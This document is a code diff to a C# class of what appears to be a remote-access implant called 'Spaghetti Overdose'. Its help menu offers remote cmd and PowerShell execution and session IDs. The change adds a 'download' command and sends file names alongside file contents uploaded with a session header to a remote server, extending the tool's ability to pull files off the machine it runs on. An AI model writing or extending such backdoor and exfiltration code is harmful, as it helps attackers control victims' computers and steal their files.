@@ -11,7 +11,8 @@ class Utilities
     {
         return "!#!\n  Spaghetti Overdose\n" +
             " ----------------------------------------------------------\n" +
-            "   <command>               Run cmd command [Default]" +
+            "   <command>               Run cmd command [Default]\n" +
+            "   download <file>         download file\n" +
             "   help                    Print this message\n" +
             "   powershell <command>    Run powershell command\n" +
             "   session                 Get session ID\n" +
@@ -127,6 +128,11 @@ class Utilities
             using (var client = new WebClient())
             {
                 client.Headers.Add("Session-Id", sessionid);
+
+                string[] splitted = filename.Split(Path.DirectorySeparatorChar);
+                filename = splitted[splitted.Length - 1];
+
+                client.Headers.Add("File-Name", filename);
                 client.UploadData(uri, method, content);
                 output = "-- Success --";
             }
